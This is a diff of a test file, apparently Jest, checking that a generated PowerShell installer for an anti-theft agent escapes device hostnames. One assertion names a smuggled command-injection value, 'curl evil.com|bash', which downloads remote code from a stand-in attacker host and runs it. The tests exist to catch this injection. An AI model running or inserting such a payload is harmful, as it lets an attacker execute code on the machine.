@@ -170,8 +170,10 @@ describe('generateInstallPs1 — hostname escaping (PowerShell)', () => {
     expect(script).toContain(`$deviceHostname = '${payload}'`);
     // The old vulnerable raw-into-double-quoted-string form must be gone.
     expect(script).not.toMatch(/Write-Host "Device: \$\(curl evil\.com\|bash\)"/);
-    // NSSM Description uses the variable.
-    expect(script).toMatch(/Description "Anti-theft agent for \$deviceHostname"/);
+    // The escaped variable is what the delegate/log lines print.
+    expect(script).toMatch(/Write-Host "Device: \$deviceHostname"/);
+    // The hostname is never passed to the installer as an interpolated argument.
+    expect(script).not.toMatch(/--hostname/);
   });
 
   test('doubles embedded single quotes in a malicious hostname', () => {
